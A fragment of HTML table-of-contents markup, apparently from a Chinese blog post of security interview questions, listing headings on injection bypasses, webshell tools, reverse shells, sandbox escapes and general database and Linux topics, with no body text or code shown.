class="toc-link" href="#CC%E6%B5%81%E9%87%8F"><span class="toc-number">62.</span> <span class="toc-text">CC流量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E9%9A%A7%E9%81%93"><span class="toc-number">63.</span> <span class="toc-text">SSH隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86"><span class="toc-number">64.</span> <span class="toc-text">runc容器逃逸原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81WAF%E7%A7%8D%E7%B1%BB"><span class="toc-number">65.</span> <span class="toc-text">常见WAF种类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E7%9A%84UAF"><span class="toc-number">66.</span> <span class="toc-text">MySQL的UAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86"><span class="toc-number">67.</span> <span class="toc-text">Java 内存马原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E6%9D%80Java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">68.</span> <span class="toc-text">如何查杀Java内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E%E5%8E%9F%E7%90%86"><span class="toc-number">69.</span> <span class="toc-text">冰蝎原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E5%8E%9F%E7%90%86"><span class="toc-number">70.</span> <span class="toc-text">哥斯拉原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A2%E9%BB%91%E6%A0%91%E5%8E%9F%E7%90%86"><span class="toc-number">71.</span> <span class="toc-text">红黑树原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%9A%84HashMap%E7%94%A8%E5%88%B0%E7%BA%A2%E9%BB%91%E6%A0%91"><span class="toc-number">72.</span> <span class="toc-text">Java的HashMap用到红黑树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E7%9A%84%E7%B4%A2%E5%BC%95%E4%B8%8E%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84"><span class="toc-number">73.</span> <span class="toc-text">MySQL的索引与存储结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8B-%E6%A0%91"><span class="toc-number">74.</span> <span class="toc-text">MySQL为什么要用B+树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="toc-number">75.</span> <span class="toc-text">Python沙箱逃逸的原理与示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">75.1.</span> <span class="toc-text">沙箱逃逸的原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%A4%BA%E4%BE%8B"><span class="toc-number">75.2.</span> <span class="toc-text">沙箱逃逸示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8%E7%A4%BA%E4%BE%8B"><span class="toc-number">75.3.</span> <span class="toc-text">栈帧逃逸示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%83%E9%80%B8%E7%9A%84%E9%98%B2%E8%8C%83"><span class="toc-number">75.4.</span> <span class="toc-text">逃逸的防范</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RASP%E7%9A%84%E6%A6%82%E5%BF%B5%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-number">76.</span> <span class="toc-text">RASP的概念和原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RASP%E7%9A%84%E5%AF%B9%E6%8A%97"><span class="toc-number">77.</span> <span class="toc-text">RASP的对抗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%92%8CGolang%E8%AF%AD%E8%A8%80%E6%9C%AC%E8%BA%AB%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">78.</span> <span class="toc-text">PHP和Golang语言本身的安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">78.1.</span> <span class="toc-text">PHP的安全问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Golang%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">78.2.</span> <span class="toc-text">Golang的安全问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">79.</span> <span class="toc-text">Flask 模板注入</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#OWASP-TOP-10"><span class="toc-number">1.</span> <span class="toc-text">OWASP TOP 10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E9%99%A4%E4%BA%86-xp-cmdshell%E3%80%81sp-oacreate-%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88%E5%8A%9E%E6%B3%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">MSSQL 除了 xp_cmdshell、sp_oacreate 还有什么办法执行命令？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLR-%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">CLR 原理以及流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-%E8%83%BD%E4%B8%8D%E8%83%BD-RCE%EF%BC%9F%E6%80%8E%E4%B9%88-RCE%EF%BC%9F%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6%E6%98%AF%E5%95%A5%EF%BC%9F"><span class="toc-number">4.</span> <span class="toc-text">Oracle 能不能 RCE？怎么 RCE？前置条件是啥？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Autotype-false-%E7%BB%95%E8%BF%87%E6%9C%89%E5%87%A0%E7%A7%8D%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="toc-number">5.</span> <span class="toc-text">Autotype&#x3D;false 绕过有几种思路？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHPInfo-%E4%BD%A0%E4%BC%9A%E5%85%B3%E6%B3%A8%E5%93%AA%E4%BA%9B%E4%BF%A1%E6%81%AF"><span class="toc-number">6.</span> <span class="toc-text">PHPInfo 你会关注哪些信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F%E5%92%8C%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F"><span class="toc-number">7.</span> <span class="toc-text">浏览器解析顺序和解码顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4limit%E5%90%8E%E7%9A%84%E9%80%97%E5%8F%B7%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">过滤limit后的逗号如何绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">9.</span> <span class="toc-text">过滤逗号的SQL注入如何绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%88SSTI%E5%8E%9F%E7%90%86%EF%BC%8C%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%8Cpayload%E7%9B%B8%E5%85%B3%E7%9A%84%E4%B8%9C%E8%A5%BF%EF%BC%89"><span class="toc-number">10.</span> <span class="toc-text">Python相关的漏洞（SSTI原理，利用过程，payload相关的东西）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">11.</span> <span class="toc-text">Java 内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E%E3%80%81%E5%93%A5%E6%96%AF%E6%8B%89%E5%B7%A5%E5%85%B7"><span class="toc-number">12.</span> <span class="toc-text">冰蝎、哥斯拉工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BC%95%E6%93%8E%E7%9A%84%E6%AD%A5%E9%AA%A4%E5%92%8C%E6%80%9D%E8%B7%AF"><span class="toc-number">13.</span> <span class="toc-text">审表达式引擎的步骤和思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%88%86%E6%9E%90"><span class="toc-number">14.</span> <span class="toc-text">XXE漏洞成因及代码层面分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%87%E5%88%B0ORDER-BY%E6%97%B6%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">15.</span> <span class="toc-text">遇到ORDER BY时的防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">16.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E8%BD%AC%E4%B9%89%E6%97%B6%E7%9A%84%E5%A4%84%E7%90%86"><span class="toc-number">17.</span> <span class="toc-text">特殊字符转义时的处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%BF%AE%E5%A4%8D%E5%9C%A8Docker%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">18.</span> <span class="toc-text">基于黑白名单的修复在Docker环境中的应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%B5%81%E7%A8%8B"><span class="toc-number">19.</span> <span class="toc-text">Java系统代码审计流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%B3%BB%E7%BB%9F%E4%B8%ADSQL%E6%B3%A8%E5%85%A5%E7%9A%84%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D"><span class="toc-number">20.</span> <span class="toc-text">Java系统中SQL注入的防御与修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">20.1.</span> <span class="toc-text">防御措施</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">20.2.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%B6%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%85%A5%E6%89%8B%E7%82%B9"><span class="toc-number">21.</span> <span class="toc-text">反序列化时的魔术方法入手点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8PHP%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8SSRF"><span class="toc-number">22.</span> <span class="toc-text">在PHP环境下利用SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E5%B8%B8%E8%A7%81%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0%E7%9A%84%E6%9F%A5%E6%89%BE"><span class="toc-number">23.</span> <span class="toc-text">PHP代码常见入口函数的查找</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E7%9A%84URL%E8%B7%AF%E7%94%B1%E6%96%B9%E6%B3%95"><span class="toc-number">24.</span> <span class="toc-text">PHP开发框架的URL路由方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%B6%89%E5%8F%8A%E7%9A%84PHP%E8%AE%BE%E7%BD%AE"><span class="toc-number">25.</span> <span class="toc-text">远程文件包含和本地文件包含涉及的PHP设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84PHP%E9%85%8D%E7%BD%AE%E9%99%90%E5%88%B6"><span class="toc-number">26.</span> <span class="toc-text">本地文件包含的PHP配置限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%9C%A8%E5%81%9ASQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%97%B6%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">27.</span> <span class="toc-text">PHP在做SQL注入防御时的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E8%A7%A3%E5%86%B3%E4%BA%86%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%EF%BC%9F"><span class="toc-number">28.</span> <span class="toc-text">Redis解决了什么问题？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%AD%E7%82%B9%E6%95%B0%E6%8D%AE%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81Redis%E5%92%8CDB%E4%B8%AD%E7%9A%84%E4%B8%80%E8%87%B4%EF%BC%9F"><span class="toc-number">29.</span> <span class="toc-text">热点数据怎么保证Redis和DB中的一致？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E6%98%AF%E6%80%8E%E4%B9%88%E5%81%9A%E7%9A%84%EF%BC%9F"><span class="toc-number">30.</span> <span class="toc-text">用户登录认证是怎么做的？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%8E%E4%B9%88%E4%BF%9D%E6%8A%A4%EF%BC%9F"><span class="toc-number">31.</span> <span class="toc-text">Token的安全怎么保护？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E7%9A%84%E5%86%85%E5%AE%B9%E8%AF%A5%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%EF%BC%9F"><span class="toc-number">32.</span> <span class="toc-text">Token的内容该如何设计？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81%E6%95%B0%E6%8D%AE%E4%B8%8D%E8%A2%AB%E7%AF%A1%E6%94%B9%E5%91%A2%EF%BC%9F"><span class="toc-number">33.</span> <span class="toc-text">怎么保证数据不被篡改呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8CCSRF%E9%98%B2%E5%BE%A1%EF%BC%9F"><span class="toc-number">34.</span> <span class="toc-text">如何进行CSRF防御？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%A1%E9%AA%8C%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">35.</span> <span class="toc-text">校验什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%8A%A0%E5%AF%86%EF%BC%9F"><span class="toc-number">36.</span> <span class="toc-text">Token为什么需要加密？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E6%B2%A1%E6%9C%89%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E8%BF%87%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7"><span class="toc-number">37.</span> <span class="toc-text">有没有自己动手写过一些工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%8E%A2%E6%B5%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8F%82%E6%95%B0%E6%98%AF%E4%BB%80%E4%B9%88-%E2%80%94-%E5%A4%A7%E5%86%99%E8%BF%98%E6%98%AF%E5%B0%8F%E5%86%99"><span class="toc-number">38.</span> <span class="toc-text">nmap探测系统的参数是什么 —&gt;大写还是小写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E7%9A%84%E5%B0%8F%E5%86%99o%E4%B8%8Ea%E6%98%AF%E5%B9%B2%E5%98%9B%E7%9A%84"><span class="toc-number">39.</span> <span class="toc-text">nmap的小写o与a是干嘛的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%B2%E7%BC%96%E7%A0%81%E5%A6%82%E4%BD%95%E7%A1%AE%E8%AE%A4%E6%98%AFbase64"><span class="toc-number">40.</span> <span class="toc-text">一串编码如何确认是base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">41.</span> <span class="toc-text">栅栏密码的原理是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E4%B8%8Emd5%E5%A6%82%E4%BD%95%E5%8C%BA%E5%88%AB"><span class="toc-number">42.</span> <span class="toc-text">base64与md5如何区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oracle%E7%9A%84%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="toc-number">43.</span> <span class="toc-text">oracle的默认端口是多少</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E7%9A%84%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%B8%80%E8%88%AC%E6%94%BE%E5%88%B0%E5%93%AA"><span class="toc-number">44.</span> <span class="toc-text">mysql的管理员密码一般放到哪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9Csubstr-%E5%87%BD%E6%95%B0%E8%A2%AB%E7%A6%81%E7%94%A8%EF%BC%8C%E4%BD%A0%E8%84%91%E5%AD%90%E9%87%8C%E6%9C%89%E5%A4%9A%E5%B0%91%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0"><span class="toc-number">45.</span> <span class="toc-text">如果substr()函数被禁用，你脑子里有多少替换函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%A6%82%E4%BD%95%E6%8B%BF%E4%B8%8B%EF%BC%8C%E5%93%AA%E4%B8%AA%E7%AB%AF%E5%8F%A3%EF%BC%8C%E5%85%B7%E4%BD%93%E8%AF%AD%E5%8F%A5%EF%BC%8C%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C"><span class="toc-number">46.</span> <span class="toc-text">redis如何拿下，哪个端口，具体语句，具体操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E9%82%AE%E7%AE%B1%E7%9F%A5%E9%81%93%E5%AF%B9%E6%96%B9%E7%9A%84IP"><span class="toc-number">47.</span> <span class="toc-text">如何通过邮箱知道对方的IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struct2%E6%BC%8F%E6%B4%9E"><span class="toc-number">48.</span> <span class="toc-text">Struct2漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E7%9A%84%E4%BB%8B%E7%BB%8D"><span class="toc-number">49.</span> <span class="toc-text">父子进程的介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B"><span class="toc-number">50.</span> <span class="toc-text">孤儿进程和僵尸进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">51.</span> <span class="toc-text">反弹shell的几种方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">52.</span> <span class="toc-text">Linux开机自启动方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#init-d%E8%84%9A%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-number">53.</span> <span class="toc-text">init.d脚本介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E8%B0%83%E7%94%A8%E4%BA%86%E5%93%AA%E4%BA%9B%E6%96%87%E4%BB%B6"><span class="toc-number">54.</span> <span class="toc-text">Linux怎么查看程序调用了哪些文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%9B%91%E6%8E%A7Linux%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">55.</span> <span class="toc-text">如何监控Linux文件操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%9C%89%E5%93%AA%E4%BA%9B%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">56.</span> <span class="toc-text">Linux有哪些系统调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BLinux%E5%BC%80%E6%94%BE%E7%9A%84%E7%BD%91%E7%BB%9C%E7%AB%AF%E5%8F%A3"><span class="toc-number">57.</span> <span class="toc-text">查看Linux开放的网络端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BLinux%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81"><span class="toc-number">58.</span> <span class="toc-text">查看Linux多线程状态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%B8%8B%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">59.</span> <span class="toc-text">Linux下隐藏文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="toc-number">60.</span> <span class="toc-text">子域名收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">61.</span> <span class="toc-text">DNS重绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">62.</span> <span class="toc-text">DNS解析的流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC%E6%B5%81%E9%87%8F"><span class="toc-number">63.</span> <span class="toc-text">CC流量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E9%9A%A7%E9%81%93"><span class="toc-number">64.</span> <span class="toc-text">SSH隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86"><span class="toc-number">65.</span> <span class="toc-text">runc容器逃逸原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81WAF%E7%A7%8D%E7%B1%BB"><span class="toc-number">66.</span> <span class="toc-text">常见WAF种类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E7%9A%84UAF"><span class="toc-number">67.</span> <span class="toc-text">MySQL的UAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86"><span class="toc-number">68.</span> <span class="toc-text">Java 内存马原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E6%9D%80Java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">69.</span> <span class="toc-text">如何查杀Java内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E%E5%8E%9F%E7%90%86"><span class="toc-number">70.</span> <span class="toc-text">冰蝎原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E5%8E%9F%E7%90%86"><span class="toc-number">71.</span> <span class="toc-text">哥斯拉原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A2%E9%BB%91%E6%A0%91%E5%8E%9F%E7%90%86"><span class="toc-number">72.</span> <span class="toc-text">红黑树原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%9A%84HashMap%E7%94%A8%E5%88%B0%E7%BA%A2%E9%BB%91%E6%A0%91"><span class="toc-number">73.</span> <span class="toc-text">Java的HashMap用到红黑树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E7%9A%84%E7%B4%A2%E5%BC%95%E4%B8%8E%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84"><span class="toc-number">74.</span> <span class="toc-text">MySQL的索引与存储结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8B-%E6%A0%91"><span class="toc-number">75.</span> <span class="toc-text">MySQL为什么要用B+树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="toc-number">76.</span> <span class="toc-text">Python沙箱逃逸的原理与示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">76.1.</span> <span class="toc-text">沙箱逃逸的原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%A4%BA%E4%BE%8B"><span class="toc-number">76.2.</span> <span class="toc-text">沙箱逃逸示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8%E7%A4%BA%E4%BE%8B"><span class="toc-number">76.3.</span> <span class="toc-text">栈帧逃逸示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%83%E9%80%B8%E7%9A%84%E9%98%B2%E8%8C%83"><span class="toc-number">76.4.</span> <span class="toc-text">逃逸的防范</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RASP%E7%9A%84%E6%A6%82%E5%BF%B5%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-number">77.</span> <span class="toc-text">RASP的概念和原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RASP%E7%9A%84%E5%AF%B9%E6%8A%97"><span class="toc-number">78.</span> <span class="toc-text">RASP的对抗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%92%8CGolang%E8%AF%AD%E8%A8%80%E6%9C%AC%E8%BA%AB%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">79.</span> <span class="toc-text">PHP和Golang语言本身的安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">79.1.</span> <span class="toc-text">PHP的安全问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 